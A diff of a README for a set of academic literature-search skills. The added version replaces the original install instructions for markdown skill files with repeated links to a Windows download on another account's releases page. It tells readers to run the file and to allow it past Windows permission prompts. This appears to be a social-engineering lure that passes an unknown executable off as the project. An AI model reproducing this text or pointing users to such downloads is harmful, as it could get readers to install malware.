@@ -1,122 +1,222 @@
-# academic-skills
+# 📚 academic-skills - Find real papers with less guesswork
 
-A collection of Claude Code skills for academic research workflows.
+[![Download](https://img.shields.io/badge/Download%20the%20release-blue?style=for-the-badge)](https://github.com/gretamutualist474/academic-skills/releases)
 
-## Skills
+## 🧭 What this is
 
-### `real-literature-trace` — Real Literature Trace
+academic-skills is a set of research helpers for academic work. It focuses on one clear task: helping you find real, traceable papers instead of vague or made-up results.
 
-Turns a vague literature request into a traceable paper set. Instead of generating plausible-sounding but fabricated references, this skill searches for real papers, verifies their sources, and returns canonical links you can actually open.
+It is built for people who want to:
+- search for papers with real links
+- build a core reading list
+- check whether a paper can be verified
+- sort papers by quality and relevance
+- work across Chinese and English sources
 
-**Triggers automatically when you say things like:**
-- 帮我找真实文献 / 找可追溯的论文
-- 整理文献综述 / 核心文献表
+## 🖥️ System requirements
+
+You need:
+- a Windows PC
+- an internet connection
+- a web browser
+- permission to download files on your computer
+
+Recommended:
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- enough free space for the download and related files
+
+## ⬇️ Download the app
+
+Visit the release page here:
+
+https://github.com/gretamutualist474/academic-skills/releases
+
+Open the page, then download the Windows file from the latest release. After the download finishes, open the file to start using it.
+
+## 🚀 Getting started
+
+1. Open the download page
+2. Find the latest release
+3. Download the Windows file from that release
+4. Open the downloaded file
+5. Follow the on-screen steps
+6. Start searching for papers
+
+If Windows asks for permission, choose the option that lets the app run.
+
+## 🔍 What it helps with
+
+This tool helps you turn a broad topic into a paper list you can trust.
+
+It can help you:
+- narrow a topic before searching
+- compare Chinese and English keywords
+- look for CNKI papers and international papers
+- check if a paper has a real source page
+- collect paper details in a clean table
+
+## 🧩 Main skill: real-literature-trace
+
+`real-literature-trace` helps when you need real literature for research work.
+
+It is useful when you ask things like:
+- 帮我找真实文献
+- 找可追溯的论文
+- 整理文献综述
+- 核心文献表
 - 筛选近五年优秀论文
 - 找国外顶会顶刊论文
 - Find me papers on X with real DOI links
 
-**What it does:**
+### What it does
 
-1. Narrows vague topics before searching — asks only the highest-value clarifying questions
-2. Builds a bilingual keyword plan across Chinese and English sources
-3. Searches with traceability in mind: CNKI for Chinese papers, DOI/publisher pages for international ones
-4. Screens candidates by relevance, venue quality, and verifiability
-5. Returns a structured table with title, authors, year, venue, selection rationale, quality grade (S/A/B/C), canonical link, CNKI link, and DOI
+- asks only the most useful follow-up questions
+- builds keyword ideas in Chinese and English
+- searches with traceability in mind
+- checks papers by topic match, venue, and source
+- returns a table with useful paper details
 
-**Output example:**
+### What you get back
 
-| 序号 | 文献题目 | 作者 | 年份 | 期刊/会议 | 质量等级 | 真实地址 | DOI |
-|------|----------|------|------|-----------|----------|----------|-----|
-| 1 | ... | ... | 2023 | IEEE TAC | S | publisher page | 10.xxxx |
+You can expect a result set with:
+- paper title
+- authors
+- year
+- venue
+- why it was selected
+- quality grade
+- link to the source
 
-**Quality guarantee:** Never fabricates titles, DOIs, or links. Marks unverified links as `待核验`. Prefers fewer real papers over many unverifiable ones.
+## 🪜 How to use it in daily work
 
----
+If you are starting a literature review, use it to find a clean first set of papers.
 
-### `academic-figure-prompt` — Academic Figure Prompt
+If your topic is too broad, use it to narrow the search before collecting sources.
 
-Generates highly detailed English prompts for AI image tools (NanoBanana / Gemini / DALL-E / Midjourney) to produce top-conference-quality academic figures — framework diagrams, network architecture diagrams, pipeline flowcharts, module detail diagrams, comparison/ablation figures, and data pattern grids.
+If you already have a few papers, use it to compare them with stronger and more traceable ones.
 
-**Triggers automatically when you say things like:**
-- 论文配图提示词 / 生成论文配图 / 架构图提示词
-- 顶会风格配图 / CVPR 风格图 / NeurIPS 风格图
-- 给我的论文写生图 prompt
-- paper figure prompt / academic diagram prompt
-- Provide a `.tex` / `.pdf` / `.docx` file and ask for figure prompts
+If you need recent work, use it to search by year and venue.
 
-**What it does:**
+If you need papers in Chinese and English, use it to search both sides without losing track of the source.
 
-1. Reads the paper source (LaTeX, PDF, Word) and extracts concepts, architectures, and data flows for each section
-2. Presents **8 preset color schemes** to choose from before generating anything — plus links to 6 color picker tools for custom palettes
-3. Generates an information-dense, multi-layer English prompt per figure, covering: global description, section-by-section module breakdown with embedded monochrome thumbnails, math formula annotations, dimension labels, and a complete STYLE SPECIFICATIONS block
-4. Enforces academic figure standards: white-dominant layout, max 3 accent colors, no colored fills, no banner bars, no gradients — passes the grayscale print test
+## 📁 Suggested workflow
 
-**Color scheme presets:**
+1. Start with a simple topic
+2. Add one or two key terms
+3. Ask for real papers only
+4. Review the returned list
+5. Keep the papers with clear source links
+6. Use the table to build your reading list
 
-| # | Name | Style |
-|---|------|-------|
-| A | Okabe-Ito | Nature / Science / CVPR, colorblind-safe |
-| B | Blue mono | Minimal, module detail diagrams |
-| C | Teal + Amber | Modern, ICLR / NeurIPS feel |
-| D | Navy + Coral | Authoritative, IEEE journal feel |
-| E | Slate + Violet | Elegant, medical / bioinformatics |
-| F | Forest + Gold | Classic, natural science journals |
-| G | Minimal Grey | Extreme minimal, arXiv report style |
-| H | Custom | User-supplied hex values |
+Example:
+- Topic: academic stress in college students
+- Goal: find real papers from the last five years
+- Output: a list of verified papers with links and reasons for selection
 
-**Color tools included:** Coolors, ColorHunt, Adobe Color, ColorBrewer (academic data viz), Viz Palette (colorblind simulation), Paletton
+## ✅ Good use cases
 
-**Supported figure types:** Overall framework · Network architecture · Module detail · Comparison / Ablation · Data / Behavior pattern grid
+- literature review for a class paper
+- finding core papers for a thesis
+- checking whether a citation is real
+- building a reading list for a project
+- comparing papers from different regions
+- finding recent work from top journals and conferences
 
-## Install
+## 🔎 What makes the results useful
 
-```bash
-# Install the full collection
-npx skills add LigphiDonk/academic-skills
+The goal is not to give you a long list of random papers.
 
-# Install a single skill by id
-npx skills add LigphiDonk/academic-skills --skill real-literature-trace
-npx skills add LigphiDonk/academic-skills --skill academic-figure-prompt
-```
+The goal is to give you papers you can open, check, and use.
 
-Restart Claude Code after installing to activate the skills.
+Each search step focuses on:
+- real sources
+- clear paper links
+- topic fit
+- venue quality
+- simple output you can read fast
 
-## Usage
+## 🧠 Tips for better results
 
-Once installed, skills trigger automatically from natural language.
+Use a topic that is clear but not too narrow.
 
-**Real Literature Trace:**
+Good examples:
+- online learning and student motivation
+- machine translation evaluation
+- academic writing support tools
+- peer feedback in higher education
 
-```
-帮我找近五年关于"图神经网络"的核心文献，需要有 CNKI 地址
-```
+If your topic is too broad, add one detail:
+- age group
+- field
+- region
+- year range
+- method
+- journal or conference type
 
-```
-Find 10 papers on spacecraft pursuit-evasion games from top journals, with DOI links
-```
+If your topic is too narrow, remove one detail and search again.
 
-**Academic Figure Prompt:**
+## 📦 After download
 
-```
-给我的论文生成整体框架图的提示词，论文在 /path/to/thesis.tex
-```
+Once you download the release:
+1. open the file from your Downloads folder
+2. follow the Windows prompts
+3. allow the app to finish setup
+4. open the app from the Start menu or desktop shortcut
+5. begin your first paper search
 
-```
-为第四章的网络架构图生成 prompt，用 Teal + Amber 配色
-```
+## 🛠️ Common file path on Windows
 
-```
-paper figure prompt for my CVPR submission, chapter 3 pipeline diagram
-```
+Most users will find the download here:
+- Downloads folder
+- Desktop
+- browser download history
 
-## Repository layout
+If you cannot find the file, open your browser’s download list and use the file location option
 
-```
-academic-skills/
-├── real-literature-trace/
-│   └── SKILL.md       # trigger conditions, search workflow, output spec
-└── academic-figure-prompt/
-    └── SKILL.md       # color selection, prompt templates, style specs
-```
+## 📌 Best way to start
 
-Each skill lives in its own directory. `SKILL.md` defines trigger conditions, the workflow, and output format.
+Begin with a short request like:
+- 找近五年关于大学生心理健康的真实论文
+- Find real papers on academic writing feedback
+- 帮我整理可追溯的核心文献表
+
+Then refine the topic after you see the first results
+
+## 🗂️ Output style
+
+The tool aims to return:
+- a structured paper table
+- clear selection reasons
+- source links you can open
+- quality grades such as S, A, B, or C
+- a mix of Chinese and English sources when useful
+
+## 🧪 For research workflows
+
+This repository fits a workflow where you need:
+- fast paper discovery
+- source checking
+- reading list building
+- literature screening
+- cross-language search support
+
+It is made to support academic research work without forcing you to sort through weak references
+
+## 🔗 Download again
+
+If you need the release page again, use this link:
+
+https://github.com/gretamutualist474/academic-skills/releases
+
+## 📄 Repository contents
+
+This repository provides skills for academic research workflows, with a focus on traceable literature search and paper screening
+
+## 🧭 Start here
+
+1. Download the latest release from the release page
+2. Open the file on Windows
+3. Use `real-literature-trace` for paper searches
+4. Review the source links
+5. Build your reading list from verified papers
